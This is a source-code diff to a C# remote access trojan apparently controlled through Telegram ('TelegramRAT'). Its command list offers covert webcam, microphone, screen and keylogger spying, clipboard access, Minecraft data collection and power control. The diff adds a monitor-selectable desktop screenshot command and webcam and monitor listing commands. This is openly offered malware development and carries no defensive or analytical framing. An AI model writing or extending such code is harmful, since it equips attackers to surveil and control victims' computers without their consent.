@@ -86,7 +86,7 @@ namespace TelegramRAT
                             "\n🎧 SPYING:" +
                             "\n /Webcam <camera> <delay>" +
                             "\n /Microphone <seconds>" +
-                            "\n /Desktop" +
+                            "\n /Desktop <monitor index (default 0)>" +
                             "\n /Keylogger" +
                             "\n" +
                             "\n📋 CLIPBOARD:" +
@@ -173,6 +173,8 @@ namespace TelegramRAT
                             "\n /isAdmin" +
                             "\n /BugReport <Title> <MessageText>" +
                             "\n /Minecraft <SaveScreenshots (yes or no)> and <CleanFolderAfterCollecting (yes or no)>" +
+                            "\n /CamList" +
+                            "\n /MonitorList" +
                             "\n" +
                             "\n💡 POWER:" +
                             "\n /Shutdown" +
@@ -371,7 +373,18 @@ namespace TelegramRAT
                 // Desktop
                 case "DESKTOP":
                     {
-                        utils.desktopScreenshot();
+                        string index;
+                        // Check if args exists
+                        try
+                        {
+                            index = args[1];
+                            utils.desktopScreenshot(Convert.ToInt32(index));
+                        }
+                        catch (IndexOutOfRangeException)
+                        {
+                            telegram.sendText("⛔ The index is not specified, taking screenshot with index 0");
+                            utils.desktopScreenshot(0);
+                        }
                         break;
                     }
                 // Keylogger
@@ -1867,6 +1880,11 @@ namespace TelegramRAT
                 case "CAMLIST":
                     {
                         utils.webcamList();
+                        break;
+                    }
+                case "MONITORLIST":
+                    {
+                        utils.ListMonitors();
                         break;
                     }
                 // Unknown command
